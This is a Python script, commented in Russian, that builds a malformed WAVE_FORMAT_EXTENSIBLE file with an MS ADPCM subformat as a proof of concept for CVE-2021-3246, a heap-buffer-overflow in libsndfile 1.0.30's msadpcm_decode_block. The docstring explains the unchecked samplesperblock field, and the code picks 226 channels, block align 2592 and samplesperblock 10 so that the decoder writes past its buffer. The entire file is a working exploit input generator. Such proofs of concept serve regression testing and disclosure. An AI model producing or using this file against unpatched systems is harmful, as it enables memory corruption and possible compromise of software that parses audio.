#!/usr/bin/env python3
"""Генератор PoC для CVE-2021-3246 в libsndfile 1.0.30.

Уязвимость: heap-buffer-overflow в msadpcm_decode_block (src/ms_adpcm.c).
Файл — WAVE_FORMAT_EXTENSIBLE с subformat MS ADPCM. libsndfile 1.0.30
для extensible-формата берёт samplesperblock из объединения WAV_FMT, где
это поле пересекается с wValidBitsPerSample. Проверка в
wavlike_msadpcm_init смотрит только blockalign и не ограничивает
samplesperblock, поэтому декодер пишет больше сэмплов, чем выделено
под channels * samplesperblock.

Параметры подобраны так, чтобы старый код гарантированно вышел за буфер:
226 каналов, blockalign 2592, samplesperblock 10.
"""

import argparse
import struct
from pathlib import Path

# GUID подформата MS ADPCM: 00000002-0000-0010-8000-00AA00389B71
MS_ADPCM_GUID = bytes.fromhex("0200000000001000800000aa00389b71")

CHANNELS = 226
BLOCK_ALIGN = 2592
SAMPLES_PER_BLOCK = 10
SAMPLE_RATE = 8000
BITS_PER_SAMPLE = 4


def build_wav() -> bytes:
    # WAVEFORMATEXTENSIBLE: 18 байт WAVEFORMATEX + 22 байта расширения.
    fmt = struct.pack(
        "<HHIIHH",
        0xFFFE,              # wFormatTag = WAVE_FORMAT_EXTENSIBLE
        CHANNELS,
        SAMPLE_RATE,
        SAMPLE_RATE * BLOCK_ALIGN,  # nAvgBytesPerSec (для PoC не важно)
        BLOCK_ALIGN,         # nBlockAlign
        BITS_PER_SAMPLE,     # wBitsPerSample
    )
    extension = (
        struct.pack("<HI", SAMPLES_PER_BLOCK, 0)  # wValidBitsPerSample, dwChannelMask
        + MS_ADPCM_GUID
    )
    fmt += struct.pack("<H", len(extension)) + extension

    data = bytes(BLOCK_ALIGN)  # сам блок; содержимое для переполнения не важно

    body = (
        b"WAVE"
        + b"fmt "
        + struct.pack("<I", len(fmt))
        + fmt
        + b"data"
        + struct.pack("<I", len(data))
        + data
    )
    return b"RIFF" + struct.pack("<I", len(body)) + body


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=Path(__file__).with_name("msadpcm_poc.wav"),
        help="куда записать WAV (по умолчанию рядом со скриптом)",
    )
    args = parser.parse_args()
    blob = build_wav()
    args.output.write_bytes(blob)
    print(f"записан {args.output} ({len(blob)} байт)")


if __name__ == "__main__":
    main()
